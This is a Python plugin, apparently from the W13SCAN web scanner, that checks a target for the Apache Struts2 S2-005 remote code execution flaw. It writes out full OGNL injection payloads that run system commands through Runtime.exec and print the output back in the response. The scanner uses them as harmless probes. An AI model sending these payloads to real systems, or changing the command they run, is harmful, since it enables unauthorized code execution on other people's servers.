# coding   :utf-8
# file     : struts2_005.py
# author   : go0p
# time     : 2019/8/18 1:52 PM
# software :PyCharm


import copy
import os
import random
import requests

from W13SCAN.lib.common import prepare_url
from W13SCAN.lib.const import acceptedExt, ignoreParams, Level
from W13SCAN.lib.output import out
from W13SCAN.lib.plugins import PluginBase
from W13SCAN.lib.wappanalyzer import fingter_loader



class W13SCAN(PluginBase):
    name = 'struts2-005远程代码执行'
    desc = ''''''
    level = Level.HIGHT

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        version = self.requests.request_version  # HTTP 0.9/1.0/1.1
        headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL
        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型

        p = self.requests.urlparse
        params = self.requests.params
        netloc = self.requests.netloc
        if self.response.language and self.response.language != "JAVA":
            return

        if method == 'GET':
            exi = os.path.splitext(p.path)[1]
            if exi not in acceptedExt:
                return

            ran_a = random.randint(10000000, 20000000)
            ran_b = random.randint(1000000, 2000000)
            ran_check = ran_a - ran_b
            lin = 'expr' + ' ' + str(ran_a) + ' - ' + str(ran_b)

            checks = [str(ran_check), '无法初始化设备 PRN', '??????? PRN', 'Struts2-vuln-Check',
                      'Unable to initialize device PRN']
            payloads = [
                r"('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'print test\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))",
                r"('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'" + lin + r"\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))",
                r'''('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))=&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))=&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))=&(i95)(('\43xman.getWriter().print("Struts2-")')(d))=&&(i96)(('\43xman.getWriter().print("vuln-Check")')(d))=&(i99)(('\43xman.getWriter().close()')(d))='''
            ]
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            for payload in payloads:
                r = requests.post(url, headers=headers, data=payload)
                html1 = r.text
                for check in checks:
                    if check in html1:
                        out.success(url, self.name, playload="{}".format(payload), method="POST", check=check,
                                    raw=r.raw)
                        return
